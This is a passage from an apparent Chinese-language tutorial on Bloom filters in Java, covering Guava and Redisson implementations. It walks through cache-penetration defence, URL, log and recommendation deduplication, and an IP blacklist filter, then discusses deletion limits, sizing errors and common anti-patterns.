        <span class="hljs-built_in">this</span>.userIdFilter = newFilter;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-keyword">return</span> userIdFilter.mightContain(userId);
    }
}
</code></pre>
<h2 data-id="heading-14">四、分布式场景实战</h2>
<h3 data-id="heading-15">4.1 单机布隆过滤器的问题</h3>
<p>在分布式环境下，单机内存中的布隆过滤器有明显的问题：</p>
<pre><code class="hljs language-java" lang="java">应用实例<span class="hljs-number">1</span>: BloomFilter <span class="hljs-title function_">A</span> <span class="hljs-params">(内存)</span>
应用实例<span class="hljs-number">2</span>: BloomFilter <span class="hljs-title function_">B</span> <span class="hljs-params">(内存)</span>
应用实例<span class="hljs-number">3</span>: BloomFilter <span class="hljs-title function_">C</span> <span class="hljs-params">(内存)</span>
</code></pre>
<p>问题：</p>
<ol>
<li>每个实例都要加载全量数据，内存浪费</li>
<li>数据不同步，A添加的元素，B和C不知道</li>
<li>扩容时，新实例需要重新加载</li>
</ol>
<h3 data-id="heading-16">4.2 Redis实现</h3>
<p>使用Redisson提供的分布式布隆过滤器。</p>
<p><strong>添加依赖：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.redisson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>redisson-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.23.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>配置：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedissonConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedissonClient <span class="hljs-title function_">redissonClient</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();
        config.useSingleServer()
            .setAddress(<span class="hljs-string">"redis://localhost:6379"</span>)
            .setDatabase(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span> Redisson.create(config);
    }
}
</code></pre>
<p><strong>使用：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedUserService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">private</span> RBloomFilter&lt;Long&gt; userIdFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 获取布隆过滤器</span>
        userIdFilter = redissonClient.getBloomFilter(<span class="hljs-string">"user:id:filter"</span>);
        
        <span class="hljs-comment">// 初始化（只需要执行一次）</span>
        <span class="hljs-keyword">if</span> (!userIdFilter.isExists()) {
            userIdFilter.tryInit(<span class="hljs-number">10_000_000</span>, <span class="hljs-number">0.01</span>);
            
            <span class="hljs-comment">// 加载用户ID</span>
            List&lt;Long&gt; userIds = userMapper.getAllUserIds();
            userIds.forEach(userIdFilter::add);
            
            log.info(<span class="hljs-string">"Redis布隆过滤器初始化完成"</span>);
        }
    }
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// 布隆过滤器判断</span>
        <span class="hljs-keyword">if</span> (!userIdFilter.contains(userId)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 查Redis缓存</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:"</span> + userId;
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> user;
        }
        
        <span class="hljs-comment">// 查数据库</span>
        user = userMapper.selectById(userId);
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            redisTemplate.opsForValue().set(cacheKey, user, <span class="hljs-number">1</span>, TimeUnit.HOURS);
        }
        
        <span class="hljs-keyword">return</span> user;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-comment">// 保存到数据库</span>
        userMapper.insert(user);
        
        <span class="hljs-comment">// 添加到布隆过滤器</span>
        userIdFilter.add(user.getId());
    }
}
</code></pre>
<h3 data-id="heading-17">4.3 架构对比</h3>
<p><strong>单机版：</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[应用实例1] --&gt; B[本地BloomFilter]
    C[应用实例2] --&gt; D[本地BloomFilter]
    E[应用实例3] --&gt; F[本地BloomFilter]
    B --&gt; G[MySQL]
    D --&gt; G
    F --&gt; G
</code></pre>
<p><strong>分布式版：</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[应用实例1] --&gt; D[Redis BloomFilter]
    B[应用实例2] --&gt; D
    C[应用实例3] --&gt; D
    D --&gt; E[MySQL]
</code></pre>
<p>分布式版的优势：</p>
<ul>
<li>所有实例共享一个过滤器</li>
<li>数据实时同步</li>
<li>节省内存（只有一份）</li>
</ul>
<h2 data-id="heading-18">五、开源项目中的使用</h2>
<p>看看大厂和知名开源项目都在哪些地方用布隆过滤器，可以给我们一些启发。</p>
<h3 data-id="heading-19">5.1 爬虫框架</h3>
<p><strong>Scrapy</strong>：Python爬虫框架用布隆过滤器做URL去重。</p>
<pre><code class="hljs">已爬URL → 放入布隆过滤器
新URL → 先查布隆过滤器 → 判断是否爬过
</code></pre>
<p>这样就不用把几亿个URL都存在内存里了。</p>
<h3 data-id="heading-20">5.2 数据库存储引擎</h3>
<p><strong>RocksDB</strong>：在读SSTable文件前，先用布隆过滤器判断key是否存在。</p>
<pre><code class="hljs language-markdown" lang="markdown">查询key → 布隆过滤器判断 
<span class="hljs-code">         → 不存在：直接返回，省一次磁盘IO
         → 可能存在：读文件确认
</span></code></pre>
<p><strong>HBase</strong>：在表配置里可以开启布隆过滤器。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">'user'</span> (
    <span class="hljs-string">'info'</span> {BLOOMFILTER <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">'ROW'</span>}
)
</code></pre>
<p>避免查询不存在的行时还要扫描磁盘。</p>
<h3 data-id="heading-21">5.3 浏览器安全</h3>
<p><strong>Chrome浏览器</strong>：用布隆过滤器判断URL是否为恶意网站。</p>
<pre><code class="hljs language-markdown" lang="markdown">本地存2MB的布隆过滤器（包含已知恶意网站）
访问网址 → 先查本地过滤器
<span class="hljs-code">         → 安全：直接访问
         → 可能危险：请求服务器确认
</span></code></pre>
<p>这样大部分URL都不用请求服务器，快很多。</p>
<h3 data-id="heading-22">5.4 消息队列</h3>
<p><strong>Kafka</strong>：某些场景下用布隆过滤器做消息去重。</p>
<p><strong>RabbitMQ</strong>：插件支持布隆过滤器防止重复消费。</p>
<hr/>
<p><strong>小结：</strong> 布隆过滤器在工业界主要用于：</p>
<ul>
<li>去重（爬虫、消息队列）</li>
<li>加速查询（数据库、存储引擎）</li>
<li>减少网络请求（浏览器安全）</li>
</ul>
<p>这些场景的共同点是：数据量大、允许一定误判、对性能要求高。</p>
<h2 data-id="heading-23">六、实际工作中的应用场景</h2>
<h3 data-id="heading-24">6.1 防止缓存穿透</h3>
<p>这是最常见的场景。</p>
<p><strong>场景描述：</strong>
系统有1000万注册用户，恶意攻击者不断请求不存在的用户ID（如：99999999），每次请求都会穿透Redis缓存，直接查询MySQL。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;Long&gt; userIdFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 初始化布隆过滤器</span>
        userIdFilter = BloomFilter.create(
            Funnels.longFunnel(),
            <span class="hljs-number">10_000_000</span>,
            <span class="hljs-number">0.01</span>
        );
        
        <span class="hljs-comment">// 加载所有用户ID</span>
        userMapper.getAllUserIds().forEach(userIdFilter::put);
    }
    
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// 布隆过滤器挡在最前面</span>
        <span class="hljs-keyword">if</span> (!userIdFilter.mightContain(userId)) {
            log.info(<span class="hljs-string">"拦截无效请求: {}"</span>, userId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-comment">// 查缓存和数据库</span>
        <span class="hljs-keyword">return</span> getUserFromCacheOrDb(userId);
    }
    
    <span class="hljs-comment">// 新用户注册时，加入过滤器</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(User user)</span> {
        userMapper.insert(user);
        userIdFilter.put(user.getId());
    }
}
</code></pre>
<p><strong>效果：</strong></p>
<ul>
<li>无效请求直接被拦截，不会打到数据库</li>
<li>QPS从500提升到5000</li>
<li>MySQL负载下降80%</li>
</ul>
<h3 data-id="heading-25">6.2 爬虫URL去重</h3>
<p><strong>场景描述：</strong>
开发一个网页爬虫，需要记录已经爬取过的URL，避免重复爬取。如果用HashSet存储1亿个URL，需要占用约4GB内存。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDuplicateChecker</span> {
    
    <span class="hljs-keyword">private</span> BloomFilter&lt;String&gt; urlFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        urlFilter = BloomFilter.create(
            Funnels.stringFunnel(Charsets.UTF_8),
            <span class="hljs-number">100_000_000</span>,  <span class="hljs-comment">// 1亿URL</span>
            <span class="hljs-number">0.03</span>          <span class="hljs-comment">// 3%误判率（爬虫场景可接受）</span>
        );
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDuplicate</span><span class="hljs-params">(String url)</span> {
        <span class="hljs-keyword">if</span> (urlFilter.mightContain(url)) {
            <span class="hljs-comment">// 可能重复，查数据库确认</span>
            <span class="hljs-keyword">return</span> urlRepository.exists(url);
        }
        
        <span class="hljs-comment">// 一定没爬过</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">markAsCrawled</span><span class="hljs-params">(String url)</span> {
        urlFilter.put(url);
        urlRepository.save(url);
    }
}
</code></pre>
<p><strong>效果：</strong></p>
<ul>
<li>内存占用从4GB降低到360MB</li>
<li>90%的重复URL在布隆过滤器阶段就被识别</li>
</ul>
<h3 data-id="heading-26">6.3 实时推荐去重</h3>
<p><strong>场景描述：</strong>
给用户推荐内容时，需要过滤掉已经推荐过的内容。用户的历史记录可能有上万条。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RecommendService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">public</span> List&lt;Content&gt; <span class="hljs-title function_">recommend</span><span class="hljs-params">(Long userId)</span> {
        <span class="hljs-comment">// 获取用户的布隆过滤器</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">filterKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"recommend:history:"</span> + userId;
        RBloomFilter&lt;Long&gt; historyFilter = 
            redissonClient.getBloomFilter(filterKey);
        
        <span class="hljs-keyword">if</span> (!historyFilter.isExists()) {
            historyFilter.tryInit(<span class="hljs-number">50_000</span>, <span class="hljs-number">0.01</span>);
            
            <span class="hljs-comment">// 加载历史记录</span>
            List&lt;Long&gt; history = recommendMapper.getHistory(userId);
            history.forEach(historyFilter::add);
        }
        
        <span class="hljs-comment">// 获取候选内容</span>
        List&lt;Content&gt; candidates = getTopCandidates(userId, <span class="hljs-number">100</span>);
        
        <span class="hljs-comment">// 过滤已推荐的</span>
        List&lt;Content&gt; filtered = candidates.stream()
            .filter(c -&gt; !historyFilter.contains(c.getId()))
            .limit(<span class="hljs-number">20</span>)
            .collect(Collectors.toList());
        
        <span class="hljs-comment">// 记录本次推荐</span>
        filtered.forEach(c -&gt; historyFilter.add(c.getId()));
        
        <span class="hljs-keyword">return</span> filtered;
    }
}
</code></pre>
<h3 data-id="heading-27">6.4 分布式日志去重</h3>
<p><strong>场景描述：</strong>
微服务架构下，同一个错误可能在多个实例上大量出现。需要对日志进行去重，避免告警轰炸。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogDeduplicator</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">private</span> RBloomFilter&lt;String&gt; logFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        logFilter = redissonClient.getBloomFilter(<span class="hljs-string">"log:dedup"</span>);
        <span class="hljs-keyword">if</span> (!logFilter.isExists()) {
            logFilter.tryInit(<span class="hljs-number">1_000_000</span>, <span class="hljs-number">0.01</span>);
        }
        
        <span class="hljs-comment">// 每小时重置一次</span>
        Executors.newSingleThreadScheduledExecutor()
            .scheduleAtFixedRate(<span class="hljs-built_in">this</span>::resetFilter, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, TimeUnit.HOURS);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logError</span><span class="hljs-params">(String message, Throwable t)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">logKey</span> <span class="hljs-operator">=</span> message + <span class="hljs-string">":"</span> + t.getStackTrace()[<span class="hljs-number">0</span>].toString();
        
        <span class="hljs-keyword">if</span> (logFilter.contains(logKey)) {
            <span class="hljs-comment">// 已经记录过，不重复告警</span>
            <span class="hljs-keyword">return</span>;
        }
        
        logFilter.add(logKey);
        
        <span class="hljs-comment">// 发送告警</span>
        alertService.sendAlert(message, t);
        
        <span class="hljs-comment">// 记录日志</span>
        log.error(message, t);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resetFilter</span><span class="hljs-params">()</span> {
        logFilter.delete();
        logFilter.tryInit(<span class="hljs-number">1_000_000</span>, <span class="hljs-number">0.01</span>);
    }
}
</code></pre>
<h3 data-id="heading-28">6.5 黑名单快速判断</h3>
<p><strong>场景描述：</strong>
API网关需要拦截黑名单IP，黑名单有100万个IP地址。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IpBlacklistFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedissonClient redissonClient;
    
    <span class="hljs-keyword">private</span> RBloomFilter&lt;String&gt; blacklistFilter;
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        blacklistFilter = redissonClient.getBloomFilter(<span class="hljs-string">"ip:blacklist"</span>);
        
        <span class="hljs-keyword">if</span> (!blacklistFilter.isExists()) {
            blacklistFilter.tryInit(<span class="hljs-number">1_000_000</span>, <span class="hljs-number">0.001</span>);  <span class="hljs-comment">// 更严格</span>
            
            <span class="hljs-comment">// 加载黑名单</span>
            List&lt;String&gt; blacklist = blacklistMapper.getAll();
            blacklist.forEach(blacklistFilter::add);
        }
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, 
                        FilterChain chain)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> getClientIp(request);
        
        <span class="hljs-comment">// 布隆过滤器判断</span>
        <span class="hljs-keyword">if</span> (blacklistFilter.contains(ip)) {
            <span class="hljs-comment">// 可能在黑名单，数据库确认</span>
            <span class="hljs-keyword">if</span> (blacklistMapper.exists(ip)) {
                response.sendError(<span class="hljs-number">403</span>, <span class="hljs-string">"IP被封禁"</span>);
                <span class="hljs-keyword">return</span>;
            }
        }
        
        chain.doFilter(request, response);
    }
}
</code></pre>
<h2 data-id="heading-29">七、使用注意事项</h2>
<h3 data-id="heading-30">7.1 不能删除元素</h3>
<p>这是布隆过滤器最大的限制。</p>
<p><strong>问题场景：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 用户注销账号</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteUser</span><span class="hljs-params">(Long userId)</span> {
    userMapper.delete(userId);
    
    <span class="hljs-comment">// 想从布隆过滤器中删除</span>
    userIdFilter.remove(userId);  <span class="hljs-comment">// 没有这个方法！</span>
}
</code></pre>
<p><strong>为什么不能删除？</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">假设 <span class="hljs-string">"user1"</span> 和 <span class="hljs-string">"user2"</span> 都映射到位置<span class="hljs-number">3</span>

bit[<span class="hljs-number">3</span>] = <span class="hljs-number">1</span>  (由user1和user2共同标记)

删除 user1 时，把 bit[<span class="hljs-number">3</span>] 设为<span class="hljs-number">0</span>
那么 user2 也查不到了！
</code></pre>
<p><strong>解决方案：</strong></p>
<p>方案1：定期重建</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Scheduled(cron = "0 0 2 * * ?")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rebuild</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 每天凌晨重建过滤器</span>
    rebuildBloomFilter();
}
</code></pre>
<p>方案2：使用Counting Bloom Filter</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 每个位置不是0/1，而是计数器</span>
<span class="hljs-type">int</span>[] counters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[size];

<span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(key)</span> {
    counters[hash1(key)]++;
    counters[hash2(key)]++;
}

<span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(key)</span> {
    counters[hash1(key)]--;
    counters[hash2(key)]--;
}
</code></pre>
<p>缺点是内存占用增加4倍（int vs bit）。</p>
<p>方案3：设置过期时间</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Redis版本，设置整体过期</span>
RBloomFilter&lt;String&gt; filter = redisson.getBloomFilter(<span class="hljs-string">"key"</span>);
filter.expire(<span class="hljs-number">1</span>, TimeUnit.DAYS);
</code></pre>
<h3 data-id="heading-31">7.2 不能更新元素</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(User user)</span> {
    userMapper.update(user);
    
    <span class="hljs-comment">// 想更新过滤器</span>
    userIdFilter.remove(oldUserId);  <span class="hljs-comment">// 不支持</span>
    userIdFilter.add(newUserId);
}
</code></pre>
<p>布隆过滤器只支持两个操作：</p>
<ul>
<li>add(): 添加元素</li>
<li>contains(): 查询元素</li>
</ul>
<p>没有update()和remove()方法。</p>
<h3 data-id="heading-32">7.3 只能判断"一定不存在"</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误理解</span>
<span class="hljs-keyword">if</span> (bloomFilter.contains(key)) {
    <span class="hljs-comment">// 以为key一定存在 ← 错误！</span>
    <span class="hljs-keyword">return</span> db.get(key);
}

<span class="hljs-comment">// 正确理解</span>
<span class="hljs-keyword">if</span> (!bloomFilter.contains(key)) {
    <span class="hljs-comment">// key一定不存在 ← 正确</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">if</span> (bloomFilter.contains(key)) {
    <span class="hljs-comment">// key可能存在，需要再确认</span>
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> db.get(key);
    <span class="hljs-keyword">return</span> user;
}
</code></pre>
<h3 data-id="heading-33">7.4 预估必须准确</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 场景：预估100万，实际插入1000万</span>
BloomFilter&lt;Long&gt; filter = BloomFilter.create(
    Funnels.longFunnel(),
    <span class="hljs-number">1_000_000</span>,  <span class="hljs-comment">// 预估</span>
    <span class="hljs-number">0.01</span>
);

<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10_000_000</span>; i++) {
    filter.put(i);  <span class="hljs-comment">// 实际</span>
}

<span class="hljs-comment">// 测试误判率</span>
<span class="hljs-type">int</span> <span class="hljs-variable">falsePositive</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">10_000_000</span>; i &lt; <span class="hljs-number">10_010_000</span>; i++) {
    <span class="hljs-keyword">if</span> (filter.mightContain(i)) {
        falsePositive++;
    }
}

System.out.println(<span class="hljs-string">"误判率: "</span> + falsePositive / <span class="hljs-number">10000.0</span>);
<span class="hljs-comment">// 输出：误判率: 0.35 (35%!)</span>
</code></pre>
<p>实际误判率远超预期的1%。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 方案1：预估时留余量</span>
<span class="hljs-type">int</span> <span class="hljs-variable">expected</span> <span class="hljs-operator">=</span> currentCount * <span class="hljs-number">2</span>;

<span class="hljs-comment">// 方案2：监控并重建</span>
<span class="hljs-keyword">if</span> (actualCount &gt; expectedCount * <span class="hljs-number">0.8</span>) {
    rebuildWithLargerCapacity();
}

<span class="hljs-comment">// 方案3：分片</span>
BloomFilter[] filters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BloomFilter</span>[<span class="hljs-number">10</span>];
<span class="hljs-type">int</span> <span class="hljs-variable">shardIndex</span> <span class="hljs-operator">=</span> userId % <span class="hljs-number">10</span>;
filters[shardIndex].add(userId);
</code></pre>
<h3 data-id="heading-34">7.5 分布式场景的同步问题</h3>
<p>单机版布隆过滤器在分布式环境下存在数据不一致。</p>
<pre><code class="hljs language-css" lang="css">实例<span class="hljs-selector-tag">A</span>添加了user1
实例<span class="hljs-selector-tag">B</span>不知道
实例<span class="hljs-selector-tag">B</span>查询user1，返回"不存在"
</code></pre>
<p>必须使用Redis等分布式实现。</p>
<h3 data-id="heading-35">7.6 序列化和持久化</h3>
<p>Guava的布隆过滤器支持序列化：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 序列化到文件</span>
BloomFilter&lt;Long&gt; filter = createFilter();
<span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"bloom.dat"</span>)) {
    filter.writeTo(fos);
}

<span class="hljs-comment">// 从文件读取</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"bloom.dat"</span>)) {
    BloomFilter&lt;Long&gt; filter = BloomFilter.readFrom(fis, Funnels.longFunnel());
}
</code></pre>
<p>这在以下场景有用：</p>
<ul>
<li>应用重启后快速恢复</li>
<li>定期备份</li>
<li>跨应用共享</li>
</ul>
<h3 data-id="heading-36">7.7 性能考虑</h3>
<p><strong>Hash函数的个数影响性能：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 误判率0.01，需要7个Hash</span>
<span class="hljs-comment">// 每次查询要计算7次Hash</span>

<span class="hljs-comment">// 误判率0.001，需要10个Hash</span>
<span class="hljs-comment">// 每次查询要计算10次Hash</span>
</code></pre>
<p>在高并发场景下，需要权衡：</p>
<ul>
<li>更低的误判率 vs 更高的CPU消耗</li>
</ul>
<p><strong>建议：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 常规场景</span>
误判率 = <span class="hljs-number">0.01</span>, Hash数 = <span class="hljs-number">7</span>

<span class="hljs-comment">// 高并发场景</span>
误判率 = <span class="hljs-number">0.03</span>, Hash数 = <span class="hljs-number">5</span>

<span class="hljs-comment">// 高精度场景</span>
误判率 = <span class="hljs-number">0.001</span>, Hash数 = <span class="hljs-number">10</span>
</code></pre>
<h3 data-id="heading-37">7.8 常见反模式</h3>
<p>这些错误在生产环境中经常出现，需要特别注意：</p>
<p><strong>反模式1：把布隆过滤器当精确集合用</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误：判断用户是否在线</span>
<span class="hljs-keyword">if</span> (onlineUsersFilter.contains(userId)) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"在线"</span>;  <span class="hljs-comment">// 可能误判！</span>
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"离线"</span>;  <span class="hljs-comment">// 这个是准的</span>
}

<span class="hljs-comment">// 布隆过滤器只能确定"一定不在"，不能确定"一定在"</span>
</code></pre>
<p><strong>反模式2：在频繁增删的场景使用</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误：购物车去重</span>
cartFilter.add(productId);      <span class="hljs-comment">// 加入购物车</span>
cartFilter.remove(productId);   <span class="hljs-comment">// 不支持删除！</span>

<span class="hljs-comment">// 购物车这种频繁增删的场景，应该用Redis Set</span>
</code></pre>
<p><strong>反模式3：忽略冷启动问题</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误：服务重启后过滤器为空</span>
<span class="hljs-meta">@PostConstruct</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
    filter = BloomFilter.create(...);
    <span class="hljs-comment">// 忘记加载历史数据</span>
}

<span class="hljs-comment">// 结果：服务重启后，所有请求都判断为"不存在"，瞬间穿透DB</span>
</code></pre>
<p><strong>反模式4：分布式环境各自维护</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误：每个实例维护本地过滤器</span>
<span class="hljs-comment">// 实例A添加了user1</span>
bloomFilter.add(<span class="hljs-number">1L</span>);

<span class="hljs-comment">// 实例B不知道，还是判断不存在</span>
<span class="hljs-comment">// 导致数据不一致</span>
</code></pre>
<p><strong>正确做法：使用Redis分布式版本。</strong></p>
<h2 data-id="heading-38">八、总结</h2>
<h3 data-id="heading-39">8.1 核心要点</h3>
<ol>
<li><strong>本质</strong>：用bit数组 + 多个Hash函数，实现空间高效的集合判断</li>
<li><strong>特点</strong>：允许一定的误判，但节省大量内存</li>
<li><strong>适用场景</strong>：海量数据去重、缓存穿透防护、黑名单判断</li>
<li><strong>关键参数</strong>：预期元素数量、误判率</li>
<li><strong>限制</strong>：不能删除、不能更新、有误判</li>
</ol>
<h3 data-id="heading-40">8.2 决策框架</h3>
<p><strong>是否该用布隆过滤器？按这个流程判断：</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 数据量是否 ≥ 百万级？
   └─ 否 → 直接用 HashSet
   └─ 是 → 继续

<span class="hljs-bullet">2.</span> 能否接受少量误判（1-3%）？
   └─ 否 → 考虑 BitMap 或 RoaringBitmap
   └─ 是 → 继续

<span class="hljs-bullet">3.</span> 主要用途是判断"不存在"？
   └─ 是 → 布隆过滤器很合适
   └─ 否 → 继续

